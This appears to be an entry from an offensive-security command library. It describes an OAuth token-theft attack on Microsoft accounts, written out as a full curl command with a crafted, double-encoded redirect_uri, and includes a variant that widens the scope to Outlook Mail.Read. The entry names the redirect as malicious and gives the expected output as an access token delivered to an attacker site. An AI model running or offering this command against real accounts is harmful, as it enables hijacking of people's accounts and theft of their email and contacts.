---
data: >-
  curl
  "https://account.live.com/Consent/Update?ru=https%3A%2F%2Flogin.live.com%2Foauth20_authorize.srf%3Flc%3D1033%26state%3Dservice%253Dmsn2%2526start%253D2016-04-18%252021%253A10%253A34%2526trigger_event%253Dtrue%2526scope%3Dwl.basic%2520wl.emails%2520wl.contacts_emails%26redirect_uri%3Dhttps%253A%252F%252Fcards.twitter.com%252Fcards%252F18ce53y6aap%2523%252Fyyms%26client_id%3D000000004403A722%26response_type%3Dcode%26contextid%3D02872644FC281255%26mkt%3DEN-US%26uiflavor%3Dweb%26id%3D279469%26client_id%3D000000004403A722%26rd%3Dtwitter.com%26scope%3Dwl.basic%2Bwl.emails%2Bwl.contacts_emails%26cscope%3D"
tags:
  - oauth
  - consent
type: command
executor: bash
platforms:
  - Web
id: 59695010-dc63-4cb0-8854-d4a51102b8ab
created_at: '2025-12-14T17:24:35.750Z'
updated_at: '2025-12-14T17:24:35.750Z'
verified: false
validated: true
submitted: true
---
# initiate-microsoft-oauth-consent

## Command

```bash
curl "https://account.live.com/Consent/Update?ru=https%3A%2F%2Flogin.live.com%2Foauth20_authorize.srf%3Flc%3D1033%26state%3Dservice%253Dmsn2%2526start%253D2016-04-18%252021%253A10%253A34%2526trigger_event%253Dtrue%2526scope%3Dwl.basic%2520wl.emails%2520wl.contacts_emails%26redirect_uri%3Dhttps%253A%252F%252Fcards.twitter.com%252Fcards%252F18ce53y6aap%2523%252Fyyms%26client_id%3D000000004403A722%26response_type%3Dcode%26contextid%3D02872644FC281255%26mkt%3DEN-US%26uiflavor%3Dweb%26id%3D279469%26client_id%3D000000004403A722%26rd%3Dtwitter.com%26scope%3Dwl.basic%2Bwl.emails%2Bwl.contacts_emails%26cscope%3D"
```

## Description

Initiates the Microsoft OAuth consent flow with a crafted redirect_uri to exploit misconfigurations and steal tokens during authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ru | Encoded OAuth authorize URL with double-encoded redirect_uri | Yes |
| scope | Permissions like wl.basic+wl.emails+wl.contacts_emails (modifiable to Mail.Read) | Yes |
| client_id | Twitter's Microsoft app ID: 000000004403A722 | Yes |
| redirect_uri | Malicious URI: https://cards.twitter.com/cards/18ce53y6aap/yyms%23 | Yes |

## Examples

### Basic Usage

```bash
curl "https://account.live.com/Consent/Update?..." # Full URL as above
```

### Advanced Usage

```bash
curl "https://account.live.com/Consent/Update?...&scope=https://outlook.office.com/Mail.Read" # For email access
```

## Expected Output

HTTP 302 redirect to consent page or authorization, eventually to attacker site with #access_token=STOLEN_TOKEN.

## Related

- [[Related Procedure: Initiate-OAuth-Consent-with-Crafted-URI]]
